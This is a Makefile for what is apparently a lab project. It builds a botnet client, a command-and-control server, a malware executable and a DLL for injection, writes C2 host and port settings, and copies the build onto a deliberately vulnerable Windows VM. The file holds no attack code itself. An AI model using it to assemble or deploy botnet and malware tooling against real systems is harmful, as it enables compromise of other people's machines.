GOCMD=go
GOBUILD=$(GOCMD) build
BINARY_NAME_CLIENT_WINDOWS=client.exe
BINARY_NAME_CLIENT_LINUX=client
BINARY_NAME_SERVER_WINDOWS=server.exe
BINARY_NAME_SERVER_LINUX=server
CLIENT_DIR=botnet/client
SERVER_DIR=botnet/server
DLL_DIR=dllinj/
MALWARE_DIR=malware/
IPADDR=xxx.xxx.xxx.xxx
PORT=XXXX


build: client_windows server_windows malware create_env
	@echo [+] created successfully

client_windows:
	cd $(CLIENT_DIR)/ && cmd /C "set GOOS=windows&& set GOARCH=amd64&& $(GOBUILD) -o ../../build/$(BINARY_NAME_CLIENT_WINDOWS) main.go"

client_linux:
	cd $(CLIENT_DIR)/ && cmd /C "set GOOS=linux&& set GOARCH=amd64&& $(GOBUILD) -o ../../build/$(BINARY_NAME_CLIENT_LINUX) main.go"

server_windows:
	cd $(SERVER_DIR)/ && cmd /C "set GOOS=windows&& set GOARCH=amd64&& $(GOBUILD) -o ../../cmdCenter/$(BINARY_NAME_SERVER_WINDOWS) main.go"

server_linux:
	cd $(SERVER_DIR)/ && cmd /C "set GOOS=linux&& set GOARCH=amd64&& $(GOBUILD) -o ../../build/$(BINARY_NAME_SERVER_LINUX) main.go"

create_env:
	@echo HOST=$(IPADDR) >> build/.env
	@echo PORT=$(PORT) >> build/.env
	@echo TYPE=tcp >> build/.env
	@echo HOST=$(IPADDR) >> cmdCenter/.env
	@echo PORT=$(PORT) >> cmdCenter/.env
	@echo TYPE=tcp >> cmdCenter/.env

malware: mal dll

dll:
	cd $(DLL_DIR)/ && gcc -shared -o ../build/baddll.dll dllmain.cpp


mal: 
	cd $(MALWARE_DIR)/ &&\
	gcc -o ../build/mal.exe main.cpp

deploy:
	@echo [+] starting up virtual machine
	VBoxManage startvm "vulnWindows"
	@echo [+] deploying code to virtual machines
	cd vmconfig && vagrant plugin install vagrant-scp
	cd vmconfig && vagrant scp ../build/ WindowsVulnMachine:/C:/Users/vagrant/desktop/
	@echo [+] done...
 